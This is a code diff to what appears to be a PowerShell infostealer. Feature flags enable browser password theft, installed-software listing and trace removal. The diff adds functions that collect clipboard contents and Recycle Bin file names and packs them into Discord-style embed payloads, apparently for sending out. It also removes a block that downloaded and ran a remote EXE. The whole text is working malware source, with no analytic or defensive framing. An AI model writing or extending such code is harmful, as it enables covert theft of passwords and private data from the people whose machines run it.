@@ -35,6 +35,8 @@ $features = @{
     "executeExe" = $false
     "gatherBrowserPass" = $true
     "gatherInstalledSoftware" = $true
+    "gatherClipboard" = $true
+    "gatherRecycleBinFiles" = $true
     "removeTraces" = $true
 }
 foreach ($feature in $features.Keys) { if (-not (Test-Path "variable:$feature")) { Set-Variable -Name $feature -Value $features[$feature] } }
@@ -108,12 +110,26 @@ if ($gatherInstalledSoftware) {
     }
 }
 
-<# Execute File #>
-if ($executeExe) {
-    Write-Output "[ + ] Executing EXE"
-    $tempFile = "$env:TEMP\UwU.exe"
-    Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile
-    Start-Process -FilePath $tempFile
+<# Clipboard Content #>
+function GetClipboard {
+    Write-Output "[ + ] Gathering clipboard content"
+    $clipboardContent = Get-Clipboard
+    if ([string]::IsNullOrEmpty($clipboardContent)) {
+        $clipboardContent = "ERROR: Clipboard is empty or access denied"
+    }
+    return $clipboardContent
+}
+
+<# Recycle Bin Files #>
+function Get-RecycleBinFiles {
+    Write-Output "[ + ] Gathering recycle bin files"
+    $shell = New-Object -com shell.application
+    $rb = $shell.Namespace(10)
+    $recycleBinItems = $rb.Items() | ForEach-Object { $_.Name }
+    if (-not $recycleBinItems) {
+        $recycleBinItems = "ERROR: Recycle Bin is empty or access denied"
+    }
+    return $recycleBinItems -join "`n"
 }
 
 <# Json Body #>
@@ -211,6 +227,24 @@ $json = @{
                 color = 0
                 author = @{
                     name = "Installed Software"
+                }
+            }
+        }
+        if ($gatherClipboard) {
+            @{
+                description = "``````$(GetClipboard)``````"
+                color = 0
+                author = @{
+                    name = "Clipboard Content"
+                }
+            }
+        }
+        if ($gatherRecycleBinFiles) {
+            @{
+                description = "``````$(Get-RecycleBinFiles)``````"
+                color = 0
+                author = @{
+                    name = "Recycle Bin Files"
                 }
             }
         }
